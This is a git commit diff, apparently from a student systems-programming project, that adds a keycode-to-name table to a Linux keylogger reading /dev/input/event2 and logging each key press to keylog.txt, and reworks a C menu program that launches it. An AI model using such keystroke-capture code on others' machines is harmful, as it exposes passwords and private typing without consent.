19565018119403841e90d16352a171de19cf3c9d
Farhana-star <78538@siswa.unimas.my>
2024-12-15 19:46:55 +0800

    Updated keylogger functionality, fixed menu, and ensured logging to keylog.txt

--- keylogger.c
+++ keylogger.c
@@ -6,6 +6,100 @@
 #include <time.h>
 #include <string.h>
 
+// Keycode-to-key mapping for all standard keys
+const char* keycode_to_string(int keycode) {
+    switch (keycode) {
+        case 1: return "Esc";
+        case 2: return "1";
+        case 3: return "2";
+        case 4: return "3";
+        case 5: return "4";
+        case 6: return "5";
+        case 7: return "6";
+        case 8: return "7";
+        case 9: return "8";
+        case 10: return "9";
+        case 11: return "0";
+        case 12: return "-";
+        case 13: return "=";
+        case 14: return "Backspace";
+        case 15: return "Tab";
+        case 16: return "Q";
+        case 17: return "W";
+        case 18: return "E";
+        case 19: return "R";
+        case 20: return "T";
+        case 21: return "Y";
+        case 22: return "U";
+        case 23: return "I";
+        case 24: return "O";
+        case 25: return "P";
+        case 26: return "[";
+        case 27: return "]";
+        case 28: return "Enter";
+        case 29: return "Ctrl";
+        case 30: return "A";
+        case 31: return "S";
+        case 32: return "D";
+        case 33: return "F";
+        case 34: return "G";
+        case 35: return "H";
+        case 36: return "J";
+        case 37: return "K";
+        case 38: return "L";
+        case 39: return ";";
+        case 40: return "'";
+        case 41: return "`";
+        case 42: return "Shift";
+        case 43: return "\\";
+        case 44: return "Z";
+        case 45: return "X";
+        case 46: return "C";
+        case 47: return "V";
+        case 48: return "B";
+        case 49: return "N";
+        case 50: return "M";
+        case 51: return ",";
+        case 52: return ".";
+        case 53: return "/";
+        case 54: return "Shift";
+        case 55: return "Keypad *";
+        case 56: return "Alt";
+        case 57: return "Space";
+        case 58: return "Caps Lock";
+        case 59: return "F1";
+        case 60: return "F2";
+        case 61: return "F3";
+        case 62: return "F4";
+        case 63: return "F5";
+        case 64: return "F6";
+        case 65: return "F7";
+        case 66: return "F8";
+        case 67: return "F9";
+        case 68: return "F10";
+        case 87: return "Num Lock";
+        case 88: return "Scroll Lock";
+        case 90: return "Keypad 7";
+        case 91: return "Keypad 8";
+        case 92: return "Keypad 9";
+        case 93: return "Keypad +";
+        case 95: return "Keypad 4";
+        case 96: return "Keypad 5";
+        case 97: return "Keypad 6";
+        case 98: return "Keypad 1";
+        case 99: return "Keypad 2";
+        case 100: return "Keypad 3";
+        case 101: return "Keypad 0";
+        case 102: return "Keypad .";
+        case 104: return "F11";
+        case 105: return "F12";
+        case 106: return "F13";
+        case 107: return "F14";
+        case 108: return "F15";
+        default: return "Unknown Key";
+    }
+}
+
 void keylogger(const char *logfile) {
     const char *device = "/dev/input/event2"; // Change this to your keyboard's event file
     struct input_event event;
@@ -46,12 +140,15 @@ void keylogger(const char *logfile) {
     while (1) {
         if (read(fd, &event, sizeof(struct input_event)) > 0) {
             if (event.type == EV_KEY && event.value == 1) { // Key press event
+                // Map the keycode to the actual key name
+                const char* key = keycode_to_string(event.code);
+
                 // Log the key press event to the log file
-                fprintf(log, "Key %d pressed at %ld\n", event.code, time(NULL));
+                fprintf(log, "Key %s pressed at %ld\n", key, time(NULL));
                 fflush(log);  // Ensure data is written immediately
             }
         } else {
-            // Debug: Print an error message if no data is read from the input file
+            // Handle error reading from the device file
             perror("Error reading from device file");
         }
     }
--- supercommand.c
+++ supercommand.c
@@ -1,80 +1,78 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>  // For getopt()
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
 #include <fcntl.h>
-#include <linux/input.h>
-#include <time.h>
+#include <errno.h>
 
-// Function declarations
 void file_operations_menu();
 void directory_operations_menu();
-void keylogger_operations_menu(int argc, char *argv[]);
+void keylogger_operations_menu(const char *logfile);
 void keylogger(const char *logfile);
 
 int main(int argc, char *argv[]) 
 {
-    // Check if command-line arguments are provided
-    if (argc == 3 && strcmp(argv[1], "-m") == 0) {
-        int mode = atoi(argv[2]);  // Extract the mode (3 for keylogger)
-        
-        // If keylogger operation mode (3), directly call the keylogger function
-        if (mode == 3) {
-            keylogger_operations_menu(argc, argv);  // Directly call the keylogger operation
-            return 0;  // Exit after running the keylogger
-        } else {
-            printf("Invalid mode selected!\n");
-            return 1;  // Invalid mode
-        }
-    } 
-    else {
-        // If no arguments are passed, show the menu system
-        int choice = 0;
-        while (1) {
-            printf("\n=== SUPER COMMAND MENU ===\n");
-            printf("1. File Operations\n");
-            printf("2. Directory Operations\n");
-            printf("3. Keylogger Operations\n");
-            printf("0. Exit\n");
-            printf("Enter your choice: ");
-            scanf("%d", &choice);
+    // Check if -m 3 is passed with a log file (keylog.txt)
+    if (argc == 4 && strcmp(argv[1], "-m") == 0 && atoi(argv[2]) == 3) {
+        const char *logfile = argv[3];  // Use the provided logfile
+        keylogger_operations_menu(logfile);  // Call the keylogger operation directly
+        return 0;  // Exit immediately after starting the keylogger
+    }
 
-            switch (choice) {
-                case 1:
-                    file_operations_menu();
-                    break;
-                case 2:
-                    directory_operations_menu();
-                    break;
-                case 3:
-                    keylogger_operations_menu(argc, argv);  // Keylogger operation
-                    break;
-                case 0:
-                    printf("Exiting program. Goodbye!\n");
-                    return 0;
-                default:
-                    printf("Invalid choice! Please try again.\n");
-            }
+    // Main menu if no command-line args are passed
+    int choice;
+    while (1) 
+    {
+        printf("\n=== SUPER COMMAND MENU ===\n");
+        printf("1. File Operations\n");
+        printf("2. Directory Operations\n");
+        printf("3. Keylogger Operations\n");
+        printf("0. Exit\n");
+        printf("Enter your choice: ");
+        scanf("%d", &choice);
+
+        switch (choice) 
+        {
+            case 1:
+                file_operations_menu();
+                break;
+
+            case 2:
+                directory_operations_menu();
+                break;
+
+            case 3:
+                keylogger_operations_menu("keylog.txt");  // Keylogger operation
+                break;
+
+            case 0:
+                printf("Exiting program. Goodbye!\n");
+                return 0;
+
+            default:
+                printf("Invalid choice! Please try again.\n");
         }
     }
 }
 
-// Keylogger menu function (with command-line args support)
-void keylogger_operations_menu(int argc, char *argv[]) {
-    // Hardcoded log file name
-    const char *logfile = "keylog.txt";  // The log file will always be 'keylog.txt'
-
-    // Print message indicating keylogger is starting
+// Keylogger menu function
+void keylogger_operations_menu(const char *logfile) 
+{
     printf("\n=== Keylogger Operations ===\n");
     printf("Starting keylogger... Log file: %s\n", logfile);
 
-    // Call the keylogger function with the log file 'keylog.txt'
+    // Start the keylogger in the background and log keystrokes
     keylogger(logfile);
 }
 
-void file_operations_menu() {
+// File operations menu function
+void file_operations_menu() 
+{
     int choice;
-    while (1) {
+    while (1) 
+    {
         printf("\n=== File Operations Menu ===\n");
         printf("1. Create/ Open File\n");
         printf("2. Change File Permission\n");
@@ -85,22 +83,28 @@ void file_operations_menu() {
         printf("Enter your choice: ");
         scanf("%d", &choice);
 
-        switch (choice) {
+        switch (choice) 
+        {
             case 1: 
                 printf("Selected: Create/Open File\n");
                 break;
+
             case 2:
                 printf("Selected: Change File Permission\n");
                 break;
+
             case 3:
                 printf("Selected: Read from File\n");
                 break;
+
             case 4:
                 printf("Selected: Write to File\n");
                 break;
+
             case 5:
                 printf("Selected: Delete File\n");
                 break;
+
             case 0:
                 return;
             default:
@@ -109,9 +113,13 @@ void file_operations_menu() {
     }
 }
 
-void directory_operations_menu() {
+// Directory operations menu function
+void directory_operations_menu() 
+{
     int choice;
-    while (1) {
+
+    while (1) 
+    {
         printf("\n=== Directory Operations Menu ===\n");
         printf("1. Create Directory\n");
         printf("2. Delete Directory\n");
@@ -119,21 +127,26 @@ void directory_operations_menu() {
         printf("4. List Files in Directory\n");
         printf("0. Back to Main Menu\n");
         printf("Enter your choice: ");
-        scanf("%d", &choice);
+        scanf ("%d", &choice);
 
-        switch (choice) {
+        switch (choice) 
+        {
             case 1: 
                 printf("Selected: Create Directory\n");
                 break;
+
             case 2: 
                 printf("Selected: Delete Directory\n");
                 break;
+
             case 3:
                 printf("Selected: Print Current Working Directory\n");
                 break;
+
             case 4:
                 printf("Selected: List Files in Directory\n");
                 break;
+
             case 0:
                 return;
             default:
